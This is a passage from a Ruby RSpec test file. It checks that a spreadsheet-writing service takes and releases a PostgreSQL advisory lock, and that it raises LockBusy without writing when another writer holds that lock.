    it "takes a session advisory lock around the write" do
      transaction = build_transaction
      connection = Transaction.connection
      allow(connection).to receive(:select_value).and_call_original
      allow(connection).to receive(:execute).and_call_original
      described_class.call(transaction: transaction, client: memory, spreadsheet_id: "sheet-42")
      expect(connection).to have_received(:select_value).with(a_string_including("pg_try_advisory_lock"))
      expect(connection).to have_received(:execute).with(a_string_including("pg_advisory_unlock"))
    end

    it "raises LockBusy without writing when another writer holds the lock" do
      transaction = build_transaction
      client = memory
      connection = Transaction.connection
      allow(connection).to receive(:select_value).and_call_original
      allow(connection).to receive(:select_value).with(a_string_including("pg_try_advisory_lock")).and_return(false)

      expect { described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-42") }
        .to raise_error(described_class::LockBusy)
      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
      expect(WorkbookEntry.count).to eq(0)
    end
  end
end
